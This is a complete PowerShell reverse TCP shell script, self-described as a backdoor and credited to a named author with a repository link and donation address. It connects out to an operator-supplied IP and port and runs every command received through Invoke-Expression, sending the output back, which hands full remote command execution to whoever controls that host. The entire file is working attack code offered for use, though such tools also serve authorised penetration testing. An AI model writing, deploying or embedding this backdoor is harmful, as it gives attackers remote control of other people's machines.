$addr = Read-Host "Enter IP address";
Write-Host "";
$port = Read-Host "Enter port number";
Write-Host "";
if ($addr.Length -lt 1 -or $port.Length -lt 1) {
	Write-Host "Both parameters are required";
} else {
	$socket = $null;
	$stream = $null;
	$buffer = $null;
	$writer = $null;
	$read = $null;
	$data = $null;
	$result = $null;
	try {
		# change the host address and/or port number as necessary
		$socket = New-Object Net.Sockets.TcpClient($addr , $port);
		Write-Host "########################################################################";
		Write-Host "#                                                                      #";
		Write-Host "#                        PowerShell Reverse TCP                        #";
		Write-Host "#                                          by Ivan Sincek              #";
		Write-Host "#                                                                      #";
		Write-Host "# GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.  #";
		Write-Host "# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.   #";
		Write-Host "#                                                                      #";
		Write-Host "########################################################################";
		Write-Host "Backdoor is up and running...";
		$stream = $socket.GetStream();
		$buffer = New-Object Byte[] 1024;
		$encoding = New-Object Text.AsciiEncoding;
		$writer = New-Object IO.StreamWriter($stream);
		$writer.AutoFlush = $true;
		do {
			$writer.Write("PS>");
			do {
				$read = $stream.Read($buffer, 0, $buffer.Length);
				if ($read -gt 0) {
					$data = $data + $encoding.GetString($buffer, 0, $read).Replace("`r`n", "").Replace("`n", "");
				} else {
					$data = "exit";
				}
			} while ($stream.DataAvailable);
			if ($data -ne "" -and $data -ne "exit") {
				try {
					$result = (Invoke-Expression $data | Out-String);
				} catch {
					$result = $_.Exception.InnerException.Message;
				}
				$writer.WriteLine($result);
				Clear-Variable -name "data";
			}
		} while ($data -ne "exit");
	} catch {
		Write-Host $_.Exception.InnerException.Message;
	} finally {
		if ($socket -ne $null) {
			$socket.Close();
			$socket.Dispose();
		}
		if ($stream -ne $null) {
			$stream.Close();
			$stream.Dispose();
		}
		if ($buffer -ne $null) {
			$buffer.Clear();
		}
		if ($writer -ne $null) {
			$writer.Close();
			$writer.Dispose();
		}
		if ($read -ne $null) {
			Clear-Variable -name "read";
		}
		if ($data -ne $null) {
			Clear-Variable -name "data";
		}
		if ($result -ne $null) {
			Clear-Variable -name "result";
		}
	}
}
